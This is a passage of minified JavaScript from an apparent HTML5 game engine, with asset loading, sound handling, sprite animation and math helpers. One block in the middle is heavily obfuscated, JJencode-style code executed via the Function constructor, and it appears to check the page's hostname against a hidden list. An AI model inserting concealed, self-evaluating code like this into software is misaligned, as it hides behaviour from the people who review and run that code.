            e && (a = new b.eR[e](a)), this.vi ? this.vi[this.vi.length - 1] != '/' && (this.vi += '/') : this.vi = '', a.src && (a.src[0] == '/' && (a.src = a.src.substring(1)), a.src = this.vi + a.src), a.CT = isNaN(a.CT) ? this.CT : Number(a.CT), a.lf = isNaN(a.lf) || a.lf === 0 ? 1 : Number(a.lf), a.m1 = a.m1 || this.XP, this.Lx += a.lf, this.IR.push(a), this.Co++
        },
        start: function() {
            this.paused = !1, this.Fq = 0, this.VL = 0, this.Nk = 0;
            var a = this;
            setTimeout(function() {
                a.XV(), a.wl(0), a.S_ ? a.pB() : a.Hz()
            }, 20)
        },
        pB: function() {
            function i() {
                var h = a.IR.length;
                if (a.Nk >= h) a.PR();
                else {
                    a.Nk == b && (a.IR[b].start(a), b++);
                    for (var c = 0; c < h; c++) {
                        var e = a.IR[c];
                        !d[c] && e.m1(a) ? (d[c] = !0, a.X4(e, a)) : e.jM && e.jM(a) && (a.Fp(e, a), a.kC && (d[c] = !0, a.Nk += 1, a.VL += e.lf))
                    }
                    var j = a.VL;
                    j !== g && (a.eb(f, a), g = j), setTimeout(i, f)
                }
            }
            var e = this.IR.length,
                f = this.CT || 10,
                a = this,
                c = typeof this.S_ == 'number' ? this.S_ : e >> 2;
            c = Math.min(e, c);
            var b = 0,
                d = {},
                g = null;
            for (var h = 0; h < c; h++) a.IR[b].start(a), b++;
            i()
        },
        Hz: function() {
            this.MU = setTimeout(this.RV, this.Gt), this.lF();
            var a = this.ja.NA;
            if (this.paused && this.DH != null) {
                this.DH(a);
                return
            }
            if (!this.ef) {
                this.PR();
                return
            }
            this.update(a)
        },
        PR: function() {
            clearTimeout(this.MU), this.vm != null && this.vm(this)
        },
        vm: null,
        vA: function(a) {
            this.wl(++this.Fq), this.AV(a, this)
        },
        getItem: function(a) {
            return this.IR[a]
        },
        wl: function(a) {
            this.Fq = a, this.ef = this.getItem(a), this.ef && (this.ef.Ql = this.ef.CT, this.ef.Ql == 0 && (this.ef.start(this), this.ef.Bt = !0))
        },
        update: function(a) {
            if (a < 1) return;
            this.ef.Ql >= this.Gt ? this.ef.Ql -= a : this.ef.Bt || (this.ef.start(this), this.ef.Bt = !0), this.ef.Bt && (this.ef.m1(this) ? (this.X4(this.ef, this), this.vA(a)) : this.ef.jM && this.ef.jM(this) && (this.Fp(this.ef, this), this.kC && (this.Nk += 1, this.VL += this.ef.lf, this.vA(a)))), this.ef && this.ef.eb && this.ef.eb(a, this), this.eb(a, this)
        },
        rF: function(a, b) {},
        X4: function(a, b) {
            if (a.vm && a.vm(b), a.zk) {
                var c = a.zk();
                this.x7[a.id] = c
            }
            this.Nk += 1, this.VL += a.lf, this.rF(a, b)
        },
        Fp: function(a, b) {
            a._A && a._A(a.sW, b), a.sW = null
        },
        eb: function(a, b) {},
        AV: function(a, b) {}
    };
    var d = c.hh = function(b) {
        for (var a in b) this[a] = b[a]
    };
    b.eR.fn = d, d.prototype = {
        constructor: d,
        id: null,
        async: !1,
        sW: null,
        start: function(a) {
            this.Wi = this.async, this.Th = this.Gf(this, a)
        },
        zk: function() {
            return this.Th
        },
        vm: function(a) {},
        m1: function(a) {
            return this.Wi
        },
        jM: function(a) {
            return this.sW
        }
    };
    var e = c.i1 = function(b) {
        for (var a in b) this[a] = b[a]
    };
    b.eR.img = e, e.prototype = {
        constructor: e,
        id: null,
        src: null,
        Wi: !1,
        async: !1,
        MV: !1,
        sW: null,
        start: function(b) {
            if (this.MV) {
                this.Wi = !0;
                return
            }
            var a = this.img = new Image();
            this.Wi = this.async, a.bK = this, a.addEventListener('load', this._t), a.addEventListener('error', this.jj), a.src = this.src, this.kR = !0
        },
        _t: function(a) {
            this.removeEventListener('load', this.bK._t), this.$m = !0, this.bK.Wi = !0, this.bK.kR = !1, this.bK.v1(this, a), delete this.bK
        },
        v1: function(a, b) {},
        jj: function(a) {
            this.removeEventListener('error', this.bK.jj), this.$m = !1, this.bK.Wi = !1, this.bK.sW = a, this.bK._A(this, a), delete this.bK
        },
        _A: function(a, b) {},
        zk: function() {
            return this.MV ? this : this.img
        },
        vm: function(a) {},
        m1: function(a) {
            return this.Wi
        },
        jM: function(a) {
            return this.sW
        }
    };
    var a = c.yL = function(b) {
        for (var a in b) this[a] = b[a]
    };
    a.ix = {
            mp3: 'audio/mpeg',
            ogg: 'audio/ogg; codecs=vorbis'
        }, b.eR.audio = a,
        function(c, b) {
            c = new Audio();
            for (b in a.ix)
                if (c.canPlayType(a.ix[b])) {
                    a.Ur = b;
                    break
                }
        }(), a.prototype = {
            constructor: a,
            id: null,
            src: null,
            Wi: !1,
            async: !1,
            MV: !1,
            sW: null,
            wrap: null,
            st: !0,
            BP: function() {
                if (typeof window != 'undefined' && window.navigator && window.navigator.userAgent && window.navigator.userAgent.toLowerCase) {
                    var a = window.navigator.userAgent.toLowerCase(),
                        c = /iphone/.test(a),
                        d = /ipad/.test(a),
                        e = /ipod/.test(a),
                        f = c || d || e,
                        b = window.location,
                        g = b && b.replace && b.reload;
                    return f && g
                }
                return !1
            },
            start: function(c) {
                if (this.MV) {
                    this.Wi = !0;
                    return
                }
                this.wrap = this.wrap === null ? c.GG : this.wrap, this.Wi = this.async;
                var b = this.so = new Audio();
                if (this.src.indexOf(a.Ur) == -1 ? b.src = this.src + '.' + a.Ur : b.src = this.src, b.loop = this.loop || !1, this.volume && (b.volume = this.volume), b.preload = !0, b.autobuffer = !0, b.autoplay = !1, this.st && this.BP()) {
                    this.Wi = !0, this.wrap = !1, this.so = null;
                    return
                }
                b.bK = this, b.addEventListener('canplaythrough', this._t), b.addEventListener('error', this.jj), b.load(), this.kR = !0
            },
            _t: function(a) {
                this.removeEventListener('canplaythrough', this.bK._t), this.$m = !0, this.bK.Wi = !0, this.bK.kR = !1, this.bK.v1(this, a), delete this.bK
            },
            v1: function(a, b) {},
            jj: function(a) {
                this.removeEventListener('error', this.bK.jj), this.$m = !1, this.bK.Wi = !1, this.bK.sW = a, this.bK._A(this, a), delete this.bK
            },
            _A: function(a, b) {},
            zk: function() {
                if (this.MV) return this;
                if (typeof Sound != 'undefined' && this.wrap && !(this.so instanceof Sound)) {
                    var a = this.options || {};
                    a.so = this.so, this.so = new Sound(a)
                }
                return this.so
            },
            m1: function(a) {
                return this.Wi
            },
            jM: function(a) {
                return this.sW
            }
        }
}(this),
function(h, i) {
    'use strict';

    function f() {}
    var a = h.Sound = function(b) {
        for (var a in b) this[a] = b[a];
        this.K()
    };
    a.prototype = {
        so: null,
        loop: !1,
        muted: !1,
        volume: 1,
        size: 1,
        yF: !0,
        K: function() {
            if (this.so)
                if (a.set(this.id, this), this.so.loop = this.loop, this.so.volume = this.volume, a.C4(this.so, !!this.muted), this.size > 1) {
                    if (this.EX = [], this.EX.push(this.so), !this.yF)
                        for (var b = 1; b < this.size; b++) this.Kf();
                    this.index = 0, this.play = this.rJ
                } else this.play = this.N_;
            else {
                for (var c in this) typeof this[c] == 'function' && (this[c] = f);
                this.play = f
            }
        },
        Kf: function() {
            var b = this.so.cloneNode();
            return b.loop = this.loop, b.volume = this.volume, a.C4(b, !!this.muted), this.EX.push(b), b
        },
        play: null,
        N_: function() {
            this.stop(), this.so.play()
        },
        rJ: function() {
            this.EX.length <= this.index && this.Kf();
            var a = this.so = this.EX[this.index];
            a.currentTime ? a.currentTime = 0 : a.EA && a.EA(0), a.play(), this.index = ++this.index % this.size
        },
        cI: function() {
            return this.so.currentTime
        },
        OD: function(a) {
            this.so.EA ? this.so.EA(a) : this.so.currentTime = a
        },
        bX: function(a) {
            this.volume = a, this.EX ? this.EX.forEach(function(b) {
                b.volume = a
            }) : this.so.volume = a
        },
        jN: function(a) {
            return this.volume
        },
        HU: function(b) {
            b = this.muted = !!b, this.EX ? this.EX.forEach(function(c) {
                a.C4(c, b)
            }) : a.C4(this.so, b)
        },
        FK: function() {
            return this.muted
        },
        pause: function() {
            this.so.pause()
        },
        YK: function() {
            this.so.play()
        },
        stop: function() {
            this.so.stop ? this.so.stop() : (this.so.pause(), this.so.currentTime = 0)
        }
    }, a.C4 = function(a, b) {
        a.muted = b
    };
    var c = {};
    a.get = function(a) {
        return c[a]
    }, a.set = function(b, a) {
        return c[b] = a, a
    }, a.clear = function() {
        c = {}
    }, a.remove = function(a) {
        var b = c[a];
        return delete c[a], b
    }, a.size = function() {
        var a = Object.keys(c);
        return a.length
    };
    var g = ['play', 'stop', 'pause', 'resume', 'setMute', 'getMute', 'setVolume', 'getVolume'];
    g.forEach(function(b) {
        a[b] = function(d, e) {
            var c = a.get(d);
            return c && c.so ? c[b](e) : void 0
        }
    }), a.muted = !1, a.pN = function(e, h, g) {
        e = !!e;
        for (var f in c) {
            if (g !== !0 && f === h) continue;
            var d = c[f];
            if (g === !0 && 'tag' in d && d.w2 === b) continue;
            d.HU ? d.HU(e) : a.C4(d, e)
        }
        a.muted = e
    }, a.Yj = function(e, b) {
        b = !!b;
        for (var f in c) {
            var d = c[f];
            d.w2 === e && (d.HU ? d.HU(b) : a.C4(d, b))
        }
        a[e + 'Muted'] = b
    }, a.hO = function(b, f, g) {
        var c = a.get(b);
        if (c && c.so) {
            var d = a.hO.ja[b],
                e = Date.now();
            if (g && !d) {
                a.hO.ja[b] = e;
                return
            }
            if (f = f || 200, !d || e - d > f) return a.hO.ja[b] = e, c.play()
        }
    }, a.hO.ja = {};
    var d = [],
        e = function(b) {
            var a = b.target;
            a.$m = !0, a.removeEventListener('canplaythrough', e)
        };
    a.a = function() {
        var a = d.shift();
        a && (a.addEventListener('canplaythrough', e), a.load())
    }, a.Wy = function(b) {
        for (var a = 0; a < b.length; a++) {
            var c = b[a];
            d.push(c)
        }
    }
}(this);
var A, Y, J;
!
function(b, a) {
    J = J || {}, a = ~[], a = {
        ___: ++a,
        $$$$: (![] + '')[a],
        __$: ++a,
        $_$_: (![] + '')[a],
        _$_: ++a,
        $_$$: ({} + '')[a],
        $$_$: (a[a] + '')[a],
        _$$: ++a,
        $$$_: 'true' [a],
        $__: ++a,
        $_$: ++a,
        $$__: ({} + '')[a],
        $$_: ++a,
        $$$: ++a,
        $___: ++a,
        $__$: ++a
    }, a.$_ = (a.$_ = a + '')[a.$_$] + (a._$ = a.$_[a.__$]) + (a.$$ = (a.$ + '')[a.__$]) + (!a + '')[a._$$] + (a.__ = a.$_[a.$$_]) + (a.$ = 'true' [a.__$]) + (a._ = 'true' [a._$_]) + a.$_[a.$_$] + a.__ + a._$ + a.$, a.$$ = a.$ + 'true' [a._$$] + a.__ + a._ + a.$ + a.$$, a.$ = a.___[a.$_][a.$_], a.$(a.$(a.$$ + '"' + '\\' + a.__$ + a._$_ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a.$$_ + a.$$_ + '\\' + a.__$ + a.__$ + a.$__ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.$$$$ + a._ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$__ + a.__ + '\\' + a.__$ + a.$_$ + a.__$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '()\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.___ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '._\\' + a.__$ + a.$$_ + a._$_ + '([' + a.$__$ + a.$$_ + ',' + a.__$ + a.$__ + ',' + a.__$ + a.$_$ + ',' + a.$__$ + ',' + a._$_ + a.___ + ',' + a.__$ + ',' + a._$$ + ',' + a.__$ + a.$_$ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + a._$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.' + a.$$$$ + a.__ + '([' + a.__$ + a._$_ + a._$$ + ',' + a._$_ + a._$$ + ',' + a._$_ + a.___ + ',' + a._$_ + a.$__ + ',' + a._$_ + a.___ + ',' + a.__$ + a.$_$ + ',' + a._$_ + a.___ + ',' + a.$__$ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.__$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.' + a.$$$$ + a.__ + '([' + a.$__$ + a.$__$ + ',' + a.$$_ + ',' + a.__$ + a.$__ + ',' + a._$_ + ',' + a.__$ + a._$$ + ',' + a._$_ + a._$$ + ',' + a.__$ + a.$$_ + ',' + a.__$ + a._$_ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.$$$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a._$_ + a.$_$ + '\\' + a.__$ + a.___ + a.$_$ + '([' + a.$__$ + a.$___ + ',' + a.__$ + a.$___ + ',' + a._$_ + a._$_ + ',' + a._$_ + a._$_ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.__$ + '.\\' + a.__$ + a.$$_ + a.$$$ + a.$_$_ + '[\\' + a.__$ + a._$_ + a.___ + '][' + a._$ + '];\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$__ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '._\\' + a.__$ + a.$$_ + a._$_ + '([' + a.$$_ + a.__$ + ',' + a.$___ + a._$$ + ',' + a.$__$ + a.$__ + ',' + a.__$ + a.$__$ + ',' + a.$___ + a._$$ + ',' + a.$__$ + a._$_ + ',' + a.$___ + a.$__ + ',' + a.$___ + a.$$$ + ',' + a.$___ + a.$__ + ',' + a.$___ + a.$_$ + ',' + a.$$$ + a.$___ + ',' + a.$___ + a.$__ + ',' + a.$$_ + a.$__$ + ',' + a.$$$ + a._$_ + ',' + a.$___ + a._$_ + ',' + a.$$_ + a.$___ + ',' + a.$$_ + a.$_$ + ',' + a.$___ + a.___ + ',' + a.$___ + a._$_ + ',' + a.$__$ + a.$__ + ',' + a.__$ + a.$__$ + ',' + a.$$_ + a.$___ + ',' + a.$___ + a._$_ + ',' + a.$___ + a.$$$ + ',' + a.$___ + a.$___ + ',' + a.$$$ + a.$__$ + ',' + a.$___ + a._$_ + ',' + a.$___ + a.___ + ',' + a.$___ + a.$___ + ',' + a.$___ + a._$$ + ',' + a.$___ + a._$_ + ',' + a.$$_ + a.$_$ + ',' + a.$___ + a.___ + ',' + a.$___ + a._$_ + ',' + a.$__$ + a.$__ + ',' + a.__$ + a.$__$ + ',' + a.$___ + a._$_ + ',' + a.$___ + a.__$ + ',' + a.$___ + a._$_ + ',' + a.$$$ + a.$___ + ',' + a.$___ + a.___ + ',' + a.$__$ + a._$_ + ',' + a.$___ + a.$___ + ',' + a.$$$ + a.$__$ + ',' + a.$___ + a.$__$ + ',' + a.$$_ + a.$_$ + ',' + a.$___ + a._$$ + ',' + a.$__$ + a.$__ + ',' + a.__$ + a.$__$ + ',' + a.$$_ + a.$___ + ',' + a.$___ + a._$_ + ',' + a.$__$ + a.$_$ + ',' + a.$$_ + a.$___ + ',' + a.$$$ + a._$$ + ',' + a.$$$ + a._$$ + ',' + a.$__$ + a._$_ + ',' + a.$__$ + a.__$ + ',' + a.$$_ + a.$_$ + ',' + a.$___ + a.___ + ',' + a.$___ + a._$_ + ',' + a.$__$ + a.$__ + ',' + a.__$ + a.$__$ + ',' + a.$$$ + a.$$$ + ',' + a.$$$ + a.$$$ + ',' + a.$__$ + a._$_ + ',' + a.$__$ + a._$_ + ',' + a.$___ + a._$$ + ',' + a.$___ + a.$__ + ',' + a.$$$ + a.$___ + ',' + a.__$ + a.$__$ + ',' + a.$___ + ',' + a.$___ + a.__$ + ',' + a.$___ + a.___ + ',' + a.$$$ + a._$$ + ',' + a.$___ + a.$_$ + ',' + a.$$_ + a.$___ + ',' + a.$$$ + a.$__$ + ',' + a.$$$ + a._$$ + ',' + a.$$_ + a.$_$ + ',' + a.__$ + a.$__$ + ',' + a.$__ + ',' + a.__$ + a.__$ + ',' + a.__$ + a._$_ + ',' + a.$$_ + a.$_$ + ',' + a.__$ + a.$__$ + ',' + a.$_$ + ',' + a.__$ + a.__$ + ',' + a.__$ + a._$_ + ',' + a.$$_ + a.$_$ + ',' + a.__$ + a.$__$ + ',' + a.__$ + a._$$ + ',' + a.__$ + a._$_ + ',' + a.$$_ + a.$_$ + ',' + a.__$ + a.$__$ + ',' + a.__$ + a.___ + ',' + a.__$ + a.$_$ + ',' + a.__$ + a._$_ + ',' + a.$$_ + a.$_$ + ',' + a.__$ + a.$__$ + ',' + a.__$ + a.$_$ + ',' + a.$__ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.___ + a.$__ + '\\' + a.$__ + a.___ + '+=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.' + a.$$$$ + a.__ + '([' + a.__$ + a.__$ + a.$__$ + ',' + a._$_ + a.$$_ + ',' + a._$_ + a.$__ + ',' + a._$_ + a.___ + ',' + a.$___ + a.$__$ + ',' + a.$$$ + ',' + a.$$$ + ',' + a._$_ + a._$_ + ',' + a._$_ + ',' + a.__$ + a.$__$ + ',' + a.$___ + a.$__$ + ',' + a.__$ + ',' + a.__$ + a.$___ + ',' + a.__$ + a.$__$ + ',' + a.__$ + a.$___ + ',' + a._$_ + a.$$_ + ',' + a._$_ + a._$_ + ',' + a.__$ + a.$$_ + ',' + a.__$ + a.$__$ + ',' + a._$_ + a.$_$ + ',' + a.__$ + a.$___ + ',' + a.__$ + a.__$ + ',' + a._$_ + a.$$_ + ',' + a._$_ + a.$__ + ',' + a._$_ + a.___ + ',' + a.$___ + a.$__$ + ',' + a.$$$ + ',' + a.$$$ + ',' + a._$_ + a._$_ + ',' + a._$_ + ',' + a.__$ + a.$__$ + ',' + a.$___ + a.$__$ + ',' + a.__$ + a.$___ + ',' + a._$_ + a.$$_ + ',' + a._$_ + a._$_ + ',' + a.__$ + a.$$_ + ',' + a.__$ + a.$__$ + ',' + a._$_ + a.$_$ + ',' + a.__$ + a.$___ + ',' + a.__$ + a.__$ + ',' + a._$_ + a.$$_ + ',' + a._$_ + a.$__ + ',' + a._$_ + a.___ + ',' + a.$___ + a.$__$ + ',' + a._$_ + ',' + a._$_ + a.$___ + ',' + a._$_ + a.$_$ + ',' + a._$_ + a._$_ + ',' + a._$$ + a.__$ + ',' + a.$__ + ',' + a._$$ + a.___ + ',' + a.__$ + a.__$ + ',' + a._$_ + a.$_$ + ',' + a._$_ + a.___ + ',' + a.$___ + a.$__$ + ',' + a.$$$ + a.__$ + ',' + a.$$_ + a.$_$ + ',' + a.$$_ + a.$___ + ',' + a.__$ + a.__$ + ',' + a._$_ + a.$$_ + ',' + a._$_ + a.$__ + ',' + a._$_ + a.___ + ',' + a.$___ + a.$__$ + ',' + a._$_ + ',' + a.__$ + a.$__$ + ',' + a._$$ + a.___ + ',' + a._$_ + a._$_ + ',' + a._$_ + a.__$ + ',' + a.__$ + a.__$ + ',' + a.$$_ + ',' + a._$$ + a.___ + ',' + a.$_$ + ',' + a._$$ + a.___ + ',' + a.__$ + a.$___ + ',' + a._$_ + a.$$_ + ',' + a.__$ + a.__$ + ',' + a.$$_ + a.$$_ + ',' + a._$$ + a.__$ + ',' + a.$$$ + a.___ + ',' + a.$$_ + a.$$_ + ',' + a.__$ + a.__$ + ',' + a.$$_ + a.$$_ + ',' + a._$$ + a.__$ + ',' + a._$_ + a.$_$ + ',' + a._$_ + a._$_ + ',' + a.___ + ',' + a.__$ + a.__$ + ',' + a.$$$ + a.$___ + ',' + a.$$$ + a.$___ + ',' + a.$$_ + a.$___ + ',' + a.$$_ + a.$$$ + ',' + a.__$ + a.__$ + ',' + a._$_ + a.$___ + ',' + a.$$_ + a.$__ + ',' + a._$_ + a.$___ + ',' + a.$$_ + a.$__ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.___ + a.$__ + '\\' + a.$__ + a.___ + '+=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.' + a.$$$$ + a.__ + '([' + a.__$ + a.__$ + a.$__$ + ',' + a._$_ + a.$_$ + ',' + a._$_ + a._$_ + ',' + a.__$ + a.$__$ + ',' + a._$$ + a.___ + ',' + a.$$_ + ',' + a._$_ + a.$_$ + ',' + a._$_ + a._$_ + ',' + a._$_ + ',' + a.__$ + a.$__ + ',' + a.__$ + a.__$ + ',' + a._$_ + a.$_$ + ',' + a._$_ + a._$_ + ',' + a.__$ + a.$__$ + ',' + a.$$_ + a.$__ + ',' + a._$_ + a.$_$ + ',' + a._$_ + a._$_ + ',' + a._$_ + ',' + a.__$ + a.$__ + ',' + a.__$ + a.__$ + ',' + a.__$ + a.$___ + ',' + a._$_ + a.$$_ + ',' + a._$_ + a._$_ + ',' + a.__$ + a.$$_ + ',' + a.__$ + a.$_$ + ',' + a._$_ + a.$__ + ',' + a._$_ + a.__$ + ',' + a.__$ + a.$___ + ',' + a.__$ + a.$___ + ',' + a.$_$ + ',' + a.__$ + a.$$$ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.___ + a.$__ + '\\' + a.$__ + a.___ + '+=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a._$_ + a.$_$ + '\\' + a.__$ + a.___ + a.$_$ + '([' + a.__$ + a.__$ + a.$___ + ',' + a._$_ + a.$__ + ',' + a._$_ + a._$$ + ',' + a.__$ + a.$__$ + ',' + a._$_ + a.$$_ + ',' + a.__$ + a.___ + ',' + a.$_$ + ',' + a._$_ + a.$_$ + ',' + a.___ + ',' + a._$_ + a._$$ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$_$ + a.__$ + a.$$$$ + '\\' + a.$__ + a.___ + '(\\' + a.__$ + a.___ + a.$$_ + '.\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$_$ + a.$$$_ + '\\' + a.__$ + a.$$$ + a.___ + '\\' + a.__$ + a.__$ + a.$$$ + a.$$$$ + '(\\' + a.__$ + a._$_ + a.$$$ + ')\\' + a.$__ + a.___ + '==\\' + a.$__ + a.___ + a.___ + ')\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.__$ + '.\\' + a.__$ + a.$$_ + a.$$$ + a.$_$_ + '[\\' + a.__$ + a._$_ + a.___ + '][\\' + a.__$ + a._$_ + a.__$ + '];\\' + a.__$ + a._$_ + '\\' + a.__$ + a.___ + a.$__ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$__ + '.\\' + a.__$ + a.$$_ + a._$$ + '\\' + a.__$ + a.$$_ + a.___ + (![] + '')[a._$_] + '\\' + a.__$ + a.$_$ + a.__$ + a.__ + '(\\"|\\");\\' + a.__$ + a._$_ + a.$$$$ + a._$ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '(\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.___ + ';\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + '\\' + a.$__ + a.___ + '<\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$__ + '.' + (![] + '')[a._$_] + a.$$$_ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.__$ + a.$__ + a.$$$ + a.__ + '\\' + a.__$ + a.$_$ + a.___ + ';\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + '++)\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + a.$_$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$__ + '[\\' + a.__$ + a._$_ + a._$$ + '];\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$_$ + a.__$ + a.$$$$ + '\\' + a.$__ + a.___ + '(\\' + a.__$ + a.$_$ + a._$_ + '.\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$_$ + a.$$$_ + '\\' + a.__$ + a.$$$ + a.___ + '\\' + a.__$ + a.__$ + a.$$$ + a.$$$$ + '(' + a.$_$_ + ')\\' + a.$__ + a.___ + '!=\\' + a.$__ + a.___ + '-' + a.__$ + ')\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a._$_ + a.$$$_ + a.__ + a._ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + a.$_$_ + '\\' + a.__$ + a._$_ + '}\\' + a.__$ + a._$_ + '}\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a._$_ + a.$$$_ + a.__ + a._ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + a.$$$$ + a.$_$_ + (![] + '')[a._$_] + '\\' + a.__$ + a.$$_ + a._$$ + a.$$$_ + '\\' + a.__$ + a._$_ + '}\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a._$_ + a.$$$_ + a.__ + a._ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + a.__ + '\\' + a.__$ + a.$$_ + a._$_ + a._ + a.$$$_ + '\\' + a.__$ + a._$_ + '}' + '"')())()
}(this);
var t;
!
function(c, d) {
    t = function(b) {
        for (var a in b) this[a] = b[a]
    };
    var a = {
        constructor: t,
        bG: null,
        duration: null,
        loop: !0,
        index: 0,
        rW: 0,
        K: function() {
            this.count = this.bG.length;
            for (var a = 0; a < this.count; a++) {
                var b = this.bG[a];
                typeof b == 'string' && (b = ResourcePool.get(b), this.bG[a] = b)
            }
            this.vG(0)
        },
        vG: function(a) {
            return this.rW = 0, this.index = a, this.img = this.bG[a], this.img
        },
        update: function(a) {
            if (this.rW >= this.duration) {
                if (this.rW = 0, ++this.index >= this.count)
                    if (this.loop) this.index = 0;
                    else return this.img;
                this.img = this.bG[this.index]
            } else this.rW += a;
            return this.img
        }
    };
    for (var b in a) t.prototype[b] = a[b]
}(this);
var J;
!
function(c, a, b) {
    J = J || {}, a = {
        qJ: Math.PI / 180,
        UP: 180 / Math.PI,
        fa: Math.PI / 2,
        As: Math.PI * 2,
        e9: function(a) {
            return a < 0.001 && a > -0.001
        },
        lO: function(b, c, a) {
            return a[0] < b && a[1] < c && b < a[2] && c < a[3]
        },
        WZ: function(a, b) {
            return a[0] < b[2] && a[1] < b[3] && a[2] > b[0] && a[3] > b[1]
        },
        random: function(a, b) {
            return (b - a) * Math.random() + a
        },
        iJ: function(a, b) {
            return (b - a + 1) * Math.random() + a >> 0
        },
        MS: function(a) {
            return (1000 * Math.random() + 1 >> 0) / 1000 <= a
        },
        yx: function(c, b) {
            var d = c.length;
            if (!b) {
                b = 0;
                for (var a = 0; a < d; a++) b += c[a]
            }
            var f = b * Math.random() + 1 >> 0,
                e = 0;
            for (var a = 0; a < d; a++)
                if (e += c[a], f <= e) return a;
            return -1
        },
        qX: function(a) {
            return a[Math.random() * a.length >> 0]
        },
        Pj: function(a) {
            return a = a || Date.now() >> 15,
                function() {
                    return a = (214013 * a + 2531011) % 4294967296, a / 4294967296
                }
        },
        mj: function(a) {
            return JSON.parse(JSON.stringify(a))
        },
        p1: function(b, c, d) {
            for (var a in c)(d !== !1 || !(a in b)) && (b[a] = c[a]);
            return b
        },
        $id: function(a) {
            return document.getElementById(a)
        },
        _Y: function(a) {
            return document.querySelector(a)
        },
        Nh: function(a) {
            return document.querySelectorAll(a)
        },
        qz: function() {},
        Rk: function(a) {
            for (var b = a.length - 1; b > 0; b--) {
                var c = Math.random() * b >> 0,
                    d = a[b];
                a[b] = a[c], a[c] = d
            }
            return a
        },
        Oz: function(b, c) {
            var a = document.createElement('canvas');
            return a.T9 = !1, a.width = b, a.height = c, a
        },
        _6: function(c) {
            var b = ResourcePool.get(c);
            if (b) return {
                img: b,
                x: 0,
                y: 0,
                w: b.width,
                h: b.height,
